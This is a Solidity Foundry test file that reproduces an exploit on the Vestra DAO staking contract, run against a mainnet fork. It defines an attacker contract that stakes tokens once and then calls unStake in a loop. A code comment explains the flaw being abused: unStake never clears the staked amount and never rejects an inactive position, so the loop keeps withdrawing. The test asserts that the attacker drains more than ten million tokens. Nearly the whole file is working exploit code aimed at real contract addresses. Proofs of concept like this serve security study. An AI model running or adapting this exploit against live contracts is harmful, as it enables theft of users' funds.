// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

interface IERC20Vestra {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
}

interface IVestraStaking {
    function stake(
        uint256 amount,
        uint8 maturity
    ) external;
    function unStake(
        uint8 maturity
    ) external;
}

contract VestraAttacker {
    IERC20Vestra private constant VSTR = IERC20Vestra(0x92D5942f468447f1F21c2092580F15544923b434);
    IVestraStaking private constant STAKING = IVestraStaking(0x8A30d684b1d3F8f36B36887a3DeCA0Ef2A36A8e3);

    function stake() external {
        VSTR.approve(address(STAKING), type(uint256).max);
        STAKING.stake(500_000 ether, 1);
    }

    function drain(
        uint256 iterations
    ) external {
        // unStake marks the position inactive but never clears stakeAmount or
        // yield, and it does not reject an already inactive position.
        for (uint256 i; i < iterations; ++i) {
            STAKING.unStake(1);
        }
    }
}

contract VestraDAOExploitTest is Test {
    IERC20Vestra private constant VSTR = IERC20Vestra(0x92D5942f468447f1F21c2092580F15544923b434);

    function testExploit() public {
        vm.createSelectFork("https://eth.drpc.org", 21_329_624);

        VestraAttacker attacker = new VestraAttacker();
        deal(address(VSTR), address(attacker), 500_000 ether);

        attacker.stake();
        vm.warp(block.timestamp + 30 days + 1);
        attacker.drain(20);

        assertGt(VSTR.balanceOf(address(attacker)), 10_000_000 ether);
    }
}
